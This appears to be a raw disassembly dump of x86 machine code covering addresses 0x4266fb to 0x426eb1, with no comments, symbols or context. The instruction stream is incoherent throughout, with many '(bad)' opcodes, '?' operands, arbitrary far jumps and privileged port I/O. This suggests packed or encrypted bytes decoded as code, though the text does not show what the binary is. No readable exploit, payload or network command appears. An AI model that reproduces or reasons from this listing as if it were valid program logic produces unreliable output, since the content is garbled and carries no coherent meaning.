  4266fb:	in     eax,0x33
  4266fd:	ss out 0x2e,eax
  426700:	dec    esp
  426701:	dec    edi
  426702:	mov    BYTE PTR [ebp-0x75d5f05f],bh
  426708:	out    0x27,al
  42670a:	jecxz  0x42674a
  42670c:	push   esi
  42670d:	mov    dh,0x47
  42670f:	stc    
  426710:	sub    BYTE PTR ds:[esi-0x3b63b11b],bl
  426717:	push   cs
  426718:	sub    DWORD PTR [ecx-0x4a],ebp
  42671b:	inc    ebx
  42671c:	ss das 
  42671e:	sub    al,BYTE PTR [ebx-0x5f]
  426721:	fld    QWORD PTR es:[edx+eax*2+0x2bbf3013]
  426729:	out    dx,eax
  42672a:	mov    edi,0x6a5fc65e
  42672f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426730:	adc    DWORD PTR [edx-0x1fb2cf97],0xbf1652a0
  42673a:	test   DWORD PTR [ecx],esp
  42673c:	test   al,0x98
  42673e:	jnp    0x42676d
  426740:	push   ebx
  426741:	repz adc edi,esi
  426744:	jmp    0x2a47:0x9d3512f
  42674b:	outs   dx,BYTE PTR ds:[esi]
  42674c:	(bad)  
  42674d:	xchg   ecx,eax
  42674e:	(bad)  
  42674f:	sti    
  426750:	cs mov bl,0x9d
  426753:	loopne 0x426788
  426755:	pop    edi
  426756:	jns    0x42673c
  426758:	pop    esi
  426759:	stos   DWORD PTR es:[edi],eax
  42675a:	sub    al,0xed
  42675c:	das    
  42675d:	adc    BYTE PTR [edi+0x38],dl
  426760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426761:	mul    BYTE PTR [ebx+ebx*8-0x2a]
  426765:	jb     0x4267d5
  426767:	sar    al,0x29
  42676a:	mov    eax,DWORD PTR [ebx+0x19]
  42676d:	and    BYTE PTR [edx+ebp*1],al
  426770:	mov    bl,cl
  426772:	add    ah,BYTE PTR ds:0x7924a08d
  426778:	pop    ss
  426779:	fiadd  DWORD PTR [ebp-0x4ade3a6]
  42677f:	leave  
  426780:	jl     0x426776
  426782:	cdq    
  426783:	pop    ss
  426784:	dec    esp
  426785:	cmc    
  426786:	ror    BYTE PTR [esi+0x76],1
  426789:	sub    cl,ah
  42678b:	and    BYTE PTR [eax-0x2e4a4eac],al
  426791:	jnp    0x426802
  426793:	or     eax,0xef9533be
  426798:	xor    DWORD PTR [ebp+0x67],esi
  42679b:	jecxz  0x42673a
  42679d:	add    al,0x34
  42679f:	leave  
  4267a0:	rol    DWORD PTR [eax+0x56],0x45
  4267a4:	mov    DWORD PTR [edx],ebx
  4267a6:	ss mov bh,0xa8
  4267a9:	iret   
  4267aa:	mov    cl,0xc4
  4267ac:	pop    ebx
  4267ad:	xor    DWORD PTR [edx-0x4c9a6285],ecx
  4267b3:	in     eax,0x6a
  4267b5:	test   BYTE PTR [edi+0x43670861],ah
  4267bb:	sub    eax,0xc67eb7f2
  4267c0:	pop    ecx
  4267c1:	mov    ?,WORD PTR [edx+0x77]
  4267c4:	mov    ch,BYTE PTR [ebx+0x19]
  4267c7:	dec    edi
  4267c8:	mov    dh,0x41
  4267ca:	jae    0x4267bc
  4267cc:	xchg   edx,eax
  4267cd:	jmp    0xeddd:0x175f5ad3
  4267d4:	enter  0x6c4a,0x26
  4267d8:	(bad)  
  4267d9:	xor    al,0x1f
  4267db:	test   bh,0x5
  4267de:	sub    dl,al
  4267e0:	xlat   BYTE PTR ds:[ebx]
  4267e1:	in     eax,dx
  4267e2:	mov    esi,0x570c886f
  4267e7:	sbb    al,0x75
  4267e9:	pop    esi
  4267ea:	cmp    dl,BYTE PTR [edi]
  4267ec:	xor    DWORD PTR [ebx],0xffffff83
  4267ef:	test   eax,0x306330cd
  4267f4:	into   
  4267f5:	ret    
  4267f6:	sub    BYTE PTR [ecx-0x4d],0x94
  4267fa:	sub    cl,bl
  4267fc:	push   esi
  4267fd:	xor    DWORD PTR [edx],ebx
  4267ff:	xchg   edx,eax
  426800:	cld    
  426801:	test   al,0x33
  426803:	pop    edx
  426804:	mov    al,0x19
  426806:	mov    bl,BYTE PTR ds:0x9d69a57d
  42680c:	clc    
  42680d:	pop    ds
  42680e:	mov    ebx,0x179a2046
  426813:	addr16 fs loope 0x4267d2
  426817:	mov    esi,0xa2e2441b
  42681c:	mov    eax,ds:0x4c668042
  426821:	ds in  eax,dx
  426823:	xor    BYTE PTR [eax+0x26879a21],0x53
  42682a:	std    
  42682b:	pop    ebp
  42682c:	jmp    0x8e:0x3e083996
  426833:	in     eax,0x28
  426835:	int    0x10
  426837:	cmp    cl,bh
  426839:	sub    eax,0xae04d7c7
  42683e:	and    bl,BYTE PTR [edx+0x54]
  426841:	outs   dx,BYTE PTR ds:[esi]
  426842:	mov    WORD PTR [edx+0x38],fs
  426845:	dec    ebx
  426846:	xchg   esp,eax
  426847:	fcom   QWORD PTR [esi+0x45]
  42684a:	(bad)  
  42684b:	xor    al,0x7b
  42684d:	jle    0x4267d1
  42684f:	dec    ebx
  426850:	clc    
  426851:	fdivr  QWORD PTR [eax+ebp*8+0x4c]
  426855:	dec    ebp
  426856:	loopne 0x426843
  426858:	lods   al,BYTE PTR ds:[esi]
  426859:	fnsave [ebp-0x18]
  42685c:	jbe    0x426828
  42685e:	add    eax,ecx
  426860:	(bad)  
  426861:	mov    edx,0x6df7b785
  426866:	xbegin 0xa71dba5f
  42686c:	sub    cl,BYTE PTR [ebp+0x3071b3b3]
  426872:	int3   
  426873:	mov    bh,BYTE PTR [eax]
  426875:	sub    eax,DWORD PTR [ebp+0x0]
  42687b:	add    BYTE PTR [eax],al
  42687d:	add    BYTE PTR [eax],al
  42687f:	add    BYTE PTR [eax],al
  426881:	ror    esi,0xf
  426884:	ror    BYTE PTR [edi],cl
  426886:	rcr    ebp,cl
  426888:	fistp  QWORD PTR [ebp+edi*8+0x37]
  42688c:	push   esp
  42688d:	test   DWORD PTR [ebx-0x79],esi
  426890:	jnp    0x4268fd
  426892:	fild   WORD PTR [ecx]
  426894:	add    BYTE PTR [esi+0x48000003],ch
  42689a:	aas    
  42689b:	mov    al,0x97
  42689d:	xchg   esp,eax
  42689e:	invd   
  4268a0:	dec    ecx
  4268a1:	sbb    cl,BYTE PTR [esi+0x617d76b7]
  4268a7:	popf   
  4268a8:	out    0xdd,al
  4268aa:	mov    esi,0xa09b6084
  4268af:	mov    bl,0xb9
  4268b1:	sahf   
  4268b2:	ret    0x5815
  4268b5:	or     eax,0xf64a3277
  4268ba:	std    
  4268bb:	sub    BYTE PTR [esi-0x1334dafa],bh
  4268c1:	retf   0xe2ea
  4268c4:	imul   ebp,DWORD PTR [edi+0x32],0xfffffffc
  4268c8:	jo     0x426877
  4268ca:	ror    BYTE PTR [ecx+0x22],1
  4268cd:	pushf  
  4268ce:	xchg   edi,eax
  4268cf:	fild   WORD PTR [edi+0x18]
  4268d2:	fisttp QWORD PTR [eax-0x26]
  4268d5:	hlt    
  4268d6:	dec    esp
  4268d7:	outs   dx,DWORD PTR ds:[esi]
  4268d8:	adc    esi,DWORD PTR [edx-0x17ee444f]
  4268de:	lahf   
  4268df:	push   esp
  4268e0:	xchg   ebx,eax
  4268e1:	fstp   QWORD PTR ds:0xa1ef149e
  4268e7:	inc    ebp
  4268e8:	rol    BYTE PTR [esi+0x76],1
  4268eb:	push   es
  4268ec:	je     0x4268f1
  4268ee:	pop    ds
  4268ef:	xor    al,BYTE PTR [eax]
  4268f1:	mov    eax,0xeb9ecf3e
  4268f6:	xlat   BYTE PTR ds:[ebx]
  4268f7:	into   
  4268f8:	pop    ss
  4268f9:	sub    BYTE PTR [ecx+0xbb47c3f],dh
  4268ff:	repnz pusha 
  426901:	out    dx,eax
  426902:	fstp   DWORD PTR [ecx]
  426904:	jb     0x426967
  426906:	sbb    BYTE PTR [ebp+0x32],0xc5
  42690a:	inc    edx
  42690b:	dec    esi
  42690c:	rcl    esi,cl
  42690e:	sbb    bh,dl
  426910:	inc    ebx
  426911:	scas   eax,DWORD PTR es:[edi]
  426912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426913:	inc    edi
  426914:	sub    al,0xb7
  426916:	inc    edx
  426917:	xchg   ebx,eax
  426918:	fcmovbe st,st(7)
  42691a:	xor    eax,0xb712f125
  42691f:	or     al,0x6
  426921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426922:	sub    BYTE PTR [ebx-0x3b],bl
  426925:	add    al,0xe4
  426927:	out    dx,al
  426928:	xchg   ebp,eax
  426929:	pop    edi
  42692a:	popa   
  42692b:	leave  
  42692c:	xor    edx,ecx
  42692e:	scas   eax,DWORD PTR es:[edi]
  42692f:	(bad)  
  426930:	data16 and bh,BYTE PTR [ebp-0x3e]
  426934:	popf   
  426935:	add    ah,cl
  426937:	sar    esp,cl
  426939:	fimul  WORD PTR [ecx]
  42693b:	mov    al,0x63
  42693d:	jmp    0xdc40:0x7e2ff051
  426944:	jg     0x42696b
  426946:	mov    ecx,0x5adc3466
  42694b:	add    DWORD PTR [ecx],eax
  42694d:	xchg   esi,eax
  42694e:	aaa    
  42694f:	in     eax,0x42
  426951:	ret    
  426952:	out    dx,eax
  426953:	xchg   BYTE PTR [ecx-0x5a],al
  426956:	inc    ebp
  426957:	push   ebx
  426958:	mov    DWORD PTR [esi],edi
  42695a:	pop    es
  42695b:	dec    ebx
  42695c:	ja     0x426992
  42695e:	popf   
  42695f:	or     al,0x58
  426961:	or     dh,BYTE PTR [esi]
  426963:	mov    al,ds:0x89b14eb4
  426968:	push   esi
  426969:	or     ah,BYTE PTR [edi+0x793ef14d]
  42696f:	and    dh,BYTE PTR [edi-0x61]
  426972:	add    eax,0xd9dc2b39
  426977:	call   0x441a:0x4d938de8
  42697e:	jg     0x4269b7
  426980:	xor    ecx,DWORD PTR [ebx]
  426982:	dec    eax
  426983:	aas    
  426984:	add    dh,dh
  426986:	pusha  
  426987:	adc    eax,0xcf1a1e39
  42698c:	ret    0xaf73
  42698f:	imul   ebx,DWORD PTR [esi-0x26],0xfa3a26e5
  426996:	sub    eax,edi
  426998:	sbb    al,BYTE PTR [ecx-0x602e67f8]
  42699e:	mov    cl,0xd
  4269a0:	stos   BYTE PTR es:[edi],al
  4269a1:	add    esp,DWORD PTR [edx]
  4269a3:	pusha  
  4269a4:	push   cs
  4269a5:	sbb    al,0xca
  4269a7:	jae    0x426968
  4269a9:	fist   WORD PTR [edi-0x70cf96fe]
  4269af:	inc    eax
  4269b0:	xchg   edi,eax
  4269b1:	stos   BYTE PTR es:[edi],al
  4269b2:	out    0xd0,al
  4269b4:	push   0x72ce29ca
  4269b9:	sbb    al,0x6a
  4269bb:	das    
  4269bc:	outs   dx,DWORD PTR ds:[esi]
  4269bd:	daa    
  4269be:	adc    DWORD PTR [ebp+0x15808330],ebx
  4269c4:	test   BYTE PTR [edi+0x103d32dd],dl
  4269ca:	aas    
  4269cb:	les    edx,FWORD PTR [edi]
  4269cd:	pop    eax
  4269ce:	and    ebp,DWORD PTR [ecx-0x26]
  4269d1:	xor    ebp,eax
  4269d3:	scas   eax,DWORD PTR es:[edi]
  4269d4:	sbb    esp,ecx
  4269d6:	pushf  
  4269d7:	mov    ch,0x63
  4269d9:	hlt    
  4269da:	aad    0xa2
  4269dc:	aaa    
  4269dd:	cdq    
  4269de:	push   eax
  4269df:	adc    BYTE PTR [ecx],al
  4269e1:	or     eax,0x91259650
  4269e6:	into   
  4269e7:	fst    QWORD PTR [edi-0x3e3f7f85]
  4269ed:	mov    esp,0x1c806b17
  4269f2:	adc    ebp,DWORD PTR [esi+0x2]
  4269f5:	dec    ebp
  4269f6:	inc    esi
  4269f7:	pop    eax
  4269f8:	mov    esp,0x50fd4eb
  4269fd:	jecxz  0x426a49
  4269ff:	lods   eax,DWORD PTR ds:[esi]
  426a00:	pop    edx
  426a01:	fcom   DWORD PTR [edx+edx*4-0x14b8e58d]
  426a08:	aas    
  426a09:	loopne 0x426a52
  426a0b:	and    al,0xea
  426a0d:	mov    ecx,0xf7a53249
  426a12:	xlat   BYTE PTR ds:[ebx]
  426a13:	dec    eax
  426a14:	shl    DWORD PTR [edx-0x19e12acf],0x6d
  426a1b:	test   bl,dh
  426a1d:	lods   al,BYTE PTR ds:[esi]
  426a1e:	push   eax
  426a1f:	jp     0x426a96
  426a21:	lds    edi,FWORD PTR [edi]
  426a23:	lea    eax,[esi]
  426a25:	xchg   cx,ax
  426a27:	test   DWORD PTR [edi],ebx
  426a29:	jp     0x426a16
  426a2b:	dec    esp
  426a2c:	hlt    
  426a2d:	loope  0x426a60
  426a2f:	aad    0xd3
  426a31:	leave  
  426a32:	cmp    al,0x9b
  426a34:	inc    edi
  426a35:	mov    al,ds:0x7ea505b
  426a3a:	fild   DWORD PTR [ecx]
  426a3c:	jg     0x4269fe
  426a3e:	in     eax,dx
  426a3f:	xlat   BYTE PTR ds:[ebx]
  426a40:	mov    BYTE PTR [ecx+ebx*1+0xaae856a],ch
  426a47:	jle    0x426ab4
  426a49:	pop    edi
  426a4a:	mov    ds:0x79bdcc19,al
  426a4f:	push   esp
  426a50:	mov    ah,0xde
  426a52:	out    0x77,al
  426a54:	or     eax,0x69afe66f
  426a59:	in     al,dx
  426a5a:	jno    0x426ad1
  426a5c:	std    
  426a5d:	fld    QWORD PTR [edx]
  426a5f:	xchg   edx,eax
  426a60:	int3   
  426a61:	inc    ebx
  426a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a63:	repnz (bad) 
  426a65:	push   ss
  426a66:	out    0x62,eax
  426a68:	inc    edx
  426a69:	test   eax,0x307980c9
  426a6e:	jmp    0x426a34
  426a70:	repz test DWORD PTR [ebx+0x2e45344b],ebx
  426a77:	repz call 0x94c3:0x672ede25
  426a7f:	and    al,BYTE PTR [eax+eax*4]
  426a82:	pop    eax
  426a83:	jl     0x426a09
  426a85:	and    al,0x46
  426a87:	jae    0x426af0
  426a89:	mov    edi,0x4e2feaa9
  426a8e:	jbe    0x426a5c
  426a90:	shl    ch,0x5c
  426a93:	xchg   edx,eax
  426a94:	push   ebx
  426a95:	adc    edi,DWORD PTR [edx-0x668f0174]
  426a9b:	pop    ebx
  426a9c:	adc    BYTE PTR [eax+0x7e],al
  426a9f:	mov    ?,edx
  426aa1:	inc    eax
  426aa2:	push   edi
  426aa3:	push   0x4d
  426aa5:	jecxz  0x426ae8
  426aa7:	ret    
  426aa8:	(bad)  
  426aaa:	cmp    ch,BYTE PTR [eax]
  426aac:	and    cl,dh
  426aae:	out    0x39,al
  426ab0:	les    esp,FWORD PTR [ecx]
  426ab2:	nop
  426ab3:	xor    esp,DWORD PTR [ecx]
  426ab5:	xchg   BYTE PTR [ecx-0x5d],bh
  426ab8:	gs (bad) 
  426aba:	push   ebp
  426abb:	sbb    DWORD PTR [edi],0x1b6c93f
  426ac1:	push   0x8ba21a92
  426ac6:	fwait
  426ac7:	shl    BYTE PTR [esi],0x74
  426aca:	push   es
  426acb:	pop    eax
  426acc:	cld    
  426acd:	mov    al,0xaa
  426acf:	inc    ebp
  426ad0:	or     al,BYTE PTR [esi+edi*4]
  426ad3:	mov    eax,0x11f08f6c
  426ad8:	aas    
  426ad9:	fst    QWORD PTR [eax-0x29046926]
  426adf:	cmp    BYTE PTR [esi+0x54],al
  426ae2:	sti    
  426ae3:	jecxz  0x426a84
  426ae5:	jmp    0xc4a28da6
  426aea:	pmovmskb ecx,mm3
  426aed:	repz (bad)
  426af0:	ds cwde 
  426af2:	pop    esp
  426af3:	fstp   st(7)
  426af5:	pop    edx
  426af6:	pop    edx
  426af7:	ret    0x3507
  426afa:	int3   
  426afb:	repz xor edx,edi
  426afe:	dec    ebx
  426aff:	pop    edi
  426b00:	std    
  426b01:	jmp    0xd75f:0x4ef838f
  426b08:	jmp    0x426adc
  426b0a:	inc    ebx
  426b0b:	(bad)  
  426b0c:	fisub  DWORD PTR [esi+0x7]
  426b0f:	cld    
  426b10:	aad    0x88
  426b12:	inc    ebx
  426b13:	adc    eax,0x9c340f2f
  426b18:	cmp    DWORD PTR [eax+0xf],esi
  426b1b:	jp     0x426b13
  426b1d:	mov    DWORD PTR ds:0x8c5eaa04,edx
  426b23:	add    BYTE PTR [edx],0xfa
  426b26:	mov    ah,0xb0
  426b28:	dec    esp
  426b29:	adc    DWORD PTR [esi+0x67],0xffffffbc
  426b2d:	jo     0x426ac2
  426b2f:	sub    BYTE PTR es:[ebx-0x56bd50bc],al
  426b36:	or     al,0x3c
  426b38:	adc    eax,0xfb9019d9
  426b3d:	outs   dx,BYTE PTR ds:[esi]
  426b3e:	loop   0x426b03
  426b40:	xchg   bl,ch
  426b42:	or     BYTE PTR [ebx+0x3da5217d],0xff
  426b49:	push   esp
  426b4a:	enter  0x443c,0xf
  426b4e:	mov    ah,0x52
  426b50:	and    bh,dl
  426b52:	mov    edx,0x7e88d38
  426b57:	mov    esp,0xbbe2aa09
  426b5c:	aam    0xc5
  426b5e:	test   eax,0xf2266470
  426b63:	pop    es
  426b64:	mov    al,ds:0xeeeeae3f
  426b69:	fadd   st,st(6)
  426b6b:	jno    0x426b11
  426b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b6e:	retf   0xc428
  426b71:	sbb    dh,BYTE PTR [eax+0x1e]
  426b74:	dec    ebp
  426b75:	out    dx,eax
  426b76:	cld    
  426b77:	push   ebp
  426b78:	sbb    BYTE PTR [ecx+ebx*2],al
  426b7b:	xchg   esp,eax
  426b7c:	jp     0x426bf0
  426b7e:	mov    ecx,0x9f63f0b
  426b83:	xchg   edi,eax
  426b84:	(bad)  
  426b85:	addr16 mov dh,0x8d
  426b88:	jb     0x426b4b
  426b8a:	xchg   edx,eax
  426b8b:	jg     0x426b3b
  426b8d:	cmp    al,0xd7
  426b8f:	hlt    
  426b90:	fild   DWORD PTR [esi-0x1c]
  426b93:	ins    DWORD PTR es:[edi],dx
  426b94:	add    BYTE PTR [edx+0x40],al
  426b97:	adc    ecx,DWORD PTR [eax]
  426b99:	add    bh,BYTE PTR [esi+edi*4]
  426b9c:	adc    cl,BYTE PTR [esi-0x7b7b05b6]
  426ba2:	shl    dl,1
  426ba4:	push   edx
  426ba5:	jo     0x426be8
  426ba7:	fisttp QWORD PTR [eax-0x5000022e]
  426bad:	fisttp WORD PTR ds:0x4832fc4e
  426bb3:	cmp    ecx,0xc269825
  426bb9:	stos   DWORD PTR es:[edi],eax
  426bba:	test   ch,0x89
  426bbd:	xor    eax,0x290ae621
  426bc2:	and    DWORD PTR [eax-0x2a01f27c],eax
  426bc8:	pop    edx
  426bc9:	jno    0x426bfb
  426bcb:	jle    0x426ba2
  426bcd:	(bad)  
  426bce:	stc    
  426bcf:	test   al,0x32
  426bd1:	sub    ch,bl
  426bd3:	js     0x426b6a
  426bd5:	ins    BYTE PTR es:[edi],dx
  426bd6:	test   eax,0xab42c6ca
  426bdb:	xlat   BYTE PTR ds:[ebx]
  426bdc:	or     DWORD PTR ds:0x6648d0e6,ebx
  426be2:	outs   dx,DWORD PTR ds:[esi]
  426be3:	rcr    DWORD PTR ds:0x15923d26,cl
  426be9:	es push ebx
  426beb:	fwait
  426bec:	iret   
  426bed:	jp     0x426c20
  426bef:	call   DWORD PTR [edx+esi*8-0x65]
  426bf3:	neg    ebx
  426bf5:	mov    esi,DWORD PTR [ebx]
  426bf7:	xchg   esp,eax
  426bf8:	(bad)
  426bfc:	xlat   BYTE PTR ds:[ebx]
  426bfd:	mov    ds:0x68aa8844,eax
  426c02:	add    edx,DWORD PTR ds:0xfa42d247
  426c08:	jle    0x426c16
  426c0a:	or     dl,BYTE PTR [ebp*4-0x72b75b6f]
  426c11:	(bad)  
  426c12:	aam    0x1a
  426c14:	hlt    
  426c15:	fbstp  TBYTE PTR [edi+0x7d]
  426c18:	call   0x1af1:0xcfc83fdb
  426c1f:	aas    
  426c20:	adc    BYTE PTR [eax+0x75],ch
  426c23:	xor    al,0x91
  426c25:	mov    al,ds:0x3edbea13
  426c2a:	lock and al,0x47
  426c2d:	sbb    eax,0x8245ae5d
  426c32:	aaa    
  426c33:	adc    DWORD PTR [ebx],esi
  426c35:	pop    ss
  426c36:	fstp   QWORD PTR [esi+0x3c]
  426c39:	inc    esi
  426c3a:	or     edi,ebx
  426c3c:	and    edx,DWORD PTR [ebp-0x5e29f147]
  426c42:	out    dx,eax
  426c43:	shl    DWORD PTR [esi+0xc5d7],1
	...
  426c51:	lock lock pusha 
  426c54:	pushf  
  426c55:	pusha  
  426c56:	pushf  
  426c57:	cld    
  426c58:	cld    
  426c59:	push   es
  426c5a:	dec    edx
  426c5b:	lock cmp esi,esi
  426c5e:	(bad)  
  426c5f:	jnp    0x426cce
  426c61:	sbb    ebx,esp
  426c63:	add    DWORD PTR [eax],eax
  426c65:	scas   al,BYTE PTR es:[edi]
  426c66:	add    eax,DWORD PTR [eax]
  426c68:	add    ch,dh
  426c6a:	mov    ecx,DWORD PTR [ebx+0x5]
  426c6d:	int3   
  426c6e:	and    DWORD PTR [eax+0x67ed7b55],ebp
  426c74:	test   BYTE PTR [ebx+esi*2-0x5ae7c5ac],ch
  426c7b:	(bad)  
  426c7c:	shl    BYTE PTR [ecx+0x688064a3],1
  426c82:	(bad)  
  426c83:	sbb    al,0x24
  426c85:	and    BYTE PTR [eax],dl
  426c87:	mov    ecx,0x637b4c31
  426c8c:	ret    0x562c
  426c8f:	fs call 0x721358f5
  426c95:	mov    DWORD PTR [edi-0x220f0c22],0xc5e8e17f
  426c9f:	in     al,0x9f
  426ca1:	inc    edi
  426ca2:	in     al,dx
  426ca3:	int    0xe7
  426ca5:	inc    esp
  426ca6:	fisttp WORD PTR [eax+0x1b]
  426ca9:	fisttp WORD PTR [ecx+0x26]
  426cac:	inc    ebp
  426cad:	out    dx,al
  426cae:	jp     0x426ca6
  426cb0:	in     al,dx
  426cb1:	mov    cl,0x97
  426cb3:	jns    0x426c4d
  426cb5:	add    bh,cl
  426cb7:	fadd   DWORD PTR [edi]
  426cb9:	fpatan 
  426cbb:	hlt    
  426cbc:	push   es
  426cbd:	mov    edi,DWORD PTR [edx+0x4c4fb3a0]
  426cc3:	sub    bh,BYTE PTR [ebp+0x70f21df4]
  426cc9:	and    esi,DWORD PTR [ecx]
  426ccb:	lds    edi,FWORD PTR [esi-0xa]
  426cce:	mov    BYTE PTR [eax+0x2ff0d377],dl
  426cd4:	ret    
  426cd5:	mov    dh,0x8d
  426cd7:	enter  0xb23b,0x83
  426cdb:	jo     0x426cd3
  426cdd:	mov    ch,0x31
  426cdf:	popf   
  426ce0:	jge    0x426d47
  426ce2:	sub    DWORD PTR ds:0xa8e94509,ebx
  426ce8:	enter  0x7aaf,0xf8
  426cec:	scas   al,BYTE PTR es:[edi]
  426ced:	in     eax,0x7f
  426cef:	or     esp,eax
  426cf1:	ins    DWORD PTR es:[edi],dx
  426cf2:	mov    edx,0x95e676e
  426cf7:	lock mov bl,0xe3
  426cfa:	daa    
  426cfb:	and    bl,BYTE PTR [ebx+0x3a]
  426cfe:	inc    esi
  426cff:	sbb    al,0xe6
  426d01:	inc    ebx
  426d02:	sub    ebx,eax
  426d04:	pop    edi
  426d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d06:	and    eax,0xcb45706
  426d0b:	pop    ds
  426d0c:	and    dl,BYTE PTR [esi]
  426d0e:	das    
  426d0f:	add    eax,0x93eb9e2b
  426d14:	and    BYTE PTR [ecx+0x2c0a1a66],dh
  426d1a:	jno    0x426d69
  426d1c:	inc    esp
  426d1d:	xor    eax,0xe4746275
  426d22:	xchg   ebx,eax
  426d23:	xchg   esi,eax
  426d24:	out    0xea,al
  426d26:	xor    al,0x60
  426d28:	pop    edx
  426d29:	(bad)  
  426d2a:	loopne 0x426da1
  426d2c:	aad    0xb4
  426d2e:	cmp    ebx,edx
  426d30:	rol    BYTE PTR [edx],0x7e
  426d33:	cli    
  426d34:	(bad)  
  426d35:	cld    
  426d36:	fs push esi
  426d38:	mov    ds:0x2694509a,al
  426d3d:	mov    ah,0x2f
  426d3f:	fiadd  WORD PTR [ebp-0x595212f3]
  426d45:	sbb    al,0x70
  426d47:	out    dx,al
  426d48:	add    al,0x78
  426d4a:	cld    
  426d4b:	aam    0x52
  426d4d:	mov    esp,DWORD PTR [edi]
  426d4f:	pop    edx
  426d50:	(bad)  
  426d51:	fist   DWORD PTR [ebx+eiz*8+0x77]
  426d55:	mov    al,ds:0xa88b3931
  426d5a:	mov    ds:0xee2cab5a,eax
  426d5f:	repnz dec edx
  426d61:	cmp    DWORD PTR [ebp+ebp*2-0xaaf8a9a],esi
  426d68:	dec    edx
  426d69:	or     DWORD PTR [edi+0x73a14cbc],ecx
  426d6f:	fs jmp 0xe1538d09
  426d75:	jo     0x426db3
  426d77:	shl    DWORD PTR [eax-0x1e],cl
  426d7a:	jge    0x426dca
  426d7c:	adc    DWORD PTR [ecx+0x30],ecx
  426d7f:	adc    ebx,edx
  426d81:	shl    DWORD PTR [esi-0x5fd5bf1d],0xad
  426d88:	add    eax,0x34d2f91b
  426d8d:	mov    edi,0x4015801d
  426d92:	out    dx,al
  426d93:	lea    ebp,[eax-0xabb661e]
  426d99:	push   edi
  426d9a:	fs pop edx
  426d9c:	inc    eax
  426d9d:	adc    BYTE PTR [eax-0x45],0x7f
  426da1:	jns    0x426d87
  426da3:	jmp    0xced4:0x5ec07a61
  426daa:	nop
  426dab:	ins    DWORD PTR es:[edi],dx
  426dac:	xor    eax,0xdfda62ee
  426db1:	cwde   
  426db2:	imul   ebx,DWORD PTR [esi],0xfffffffb
  426db5:	xchg   edi,eax
  426db6:	jb     0x426ddf
  426db8:	pop    esi
  426db9:	push   ebp
  426dba:	inc    ebx
  426dbb:	js     0x426d82
  426dbd:	jp     0x426e35
  426dbf:	or     DWORD PTR [eax+esi*4+0xa],esi
  426dc3:	mov    ebx,DWORD PTR [edi]
  426dc5:	pushf  
  426dc6:	fistp  WORD PTR [esi-0x5d76bc6f]
  426dcc:	push   es
  426dcd:	pop    ebx
  426dce:	push   es
  426dcf:	and    BYTE PTR [edx],cl
  426dd1:	push   edx
  426dd2:	call   DWORD PTR [edx]
  426dd4:	retf   
  426dd5:	lock add al,0x89
  426dd8:	xchg   edx,eax
  426dd9:	pop    ebp
  426dda:	scas   al,BYTE PTR es:[edi]
  426ddb:	add    al,0x7a
  426ddd:	in     eax,dx
  426dde:	push   ss
  426ddf:	and    DWORD PTR [ecx+0x3d],0xffffffda
  426de3:	les    ebx,FWORD PTR [eax+0x7e947259]
  426de9:	setp   bl
  426dec:	and    al,BYTE PTR [edi+0x9]
  426def:	pushf  
  426df0:	push   esp
  426df1:	daa    
  426df2:	loop   0x426db8
  426df4:	psubd  mm2,mm4
  426df7:	sahf   
  426df8:	imul   eax,DWORD PTR [esi-0x2f80c711],0x5b
  426dff:	adc    al,0x3b
  426e01:	in     eax,0xf4
  426e03:	push   ebx
  426e04:	out    0xd5,al
  426e06:	inc    edi
  426e07:	add    dl,BYTE PTR [edx+0x5c650119]
  426e0d:	push   ds
  426e0e:	pusha  
  426e0f:	pop    eax
  426e10:	push   edi
  426e11:	sub    al,0xe5
  426e13:	div    ebp
  426e15:	cmp    eax,0x72890fd5
  426e1a:	ss pop esi
  426e1c:	fcomp  DWORD PTR [esi+0x2374c7dd]
  426e22:	xor    ah,BYTE PTR [ecx+0x34]
  426e25:	pop    ds
  426e26:	iret   
  426e27:	mov    BYTE PTR [esi],bh
  426e29:	fadd   DWORD PTR [edi]
  426e2b:	mov    al,0x3e
  426e2d:	mov    esi,0x8debdc0e
  426e32:	jge    0x426e28
  426e34:	adc    eax,esp
  426e36:	mov    ds:0x11a4d954,eax
  426e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e3c:	fdivr  st,st(6)
  426e3e:	push   eax
  426e3f:	jp     0x426eaf
  426e41:	push   ebp
  426e42:	cmp    esp,DWORD PTR [ebp+0x60]
  426e45:	jecxz  0x426eb6
  426e47:	and    cl,BYTE PTR [ecx+0x72eb0057]
  426e4d:	fs push es
  426e4f:	pop    esp
  426e50:	pop    es
  426e51:	rcl    DWORD PTR [esi+0x52c4511e],cl
  426e57:	xchg   ecx,eax
  426e58:	jp     0x426e13
  426e5a:	xchg   esi,eax
  426e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e5c:	(bad)  
  426e5e:	ins    DWORD PTR es:[edi],dx
  426e5f:	(bad)  
  426e61:	add    DWORD PTR [eax-0x4c],esi
  426e64:	jbe    0x426ecf
  426e66:	(bad)  [edi+0x5f]
  426e69:	mov    esi,0x26bfc3cb
  426e6e:	(bad)  
  426e6f:	push   ebp
  426e70:	out    0xed,al
  426e72:	push   ebp
  426e73:	sti    
  426e74:	jp     0x426ec7
  426e76:	mov    bh,0x9a
  426e78:	cmp    eax,0x11e10fc0
  426e7d:	push   ebp
  426e7e:	pushf  
  426e7f:	push   esp
  426e80:	push   ss
  426e81:	add    DWORD PTR [esi+edi*2],0x6cabf77b
  426e88:	jo     0x426e27
  426e8a:	pop    eax
  426e8b:	sub    al,0x4f
  426e8d:	sub    eax,0x54e1f6f5
  426e92:	mov    bh,0x66
  426e94:	sub    esi,DWORD PTR [ebp-0x9fe5fd5]
  426e9a:	dec    edi
  426e9b:	jbe    0x426e70
  426e9d:	in     al,dx
  426e9e:	stos   DWORD PTR es:[edi],eax
  426e9f:	and    ebp,eax
  426ea1:	adc    al,0x7c
  426ea3:	int    0xe
  426ea5:	rep lods al,BYTE PTR ds:[esi]
  426ea7:	pop    edx
  426ea8:	jnp    0x426e2f
  426eaa:	cwde   
  426eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426eac:	mov    ds:0xcba1641a,eax
  426eb1:	sbb    edi,DWORD PTR [ecx-0xf300407]
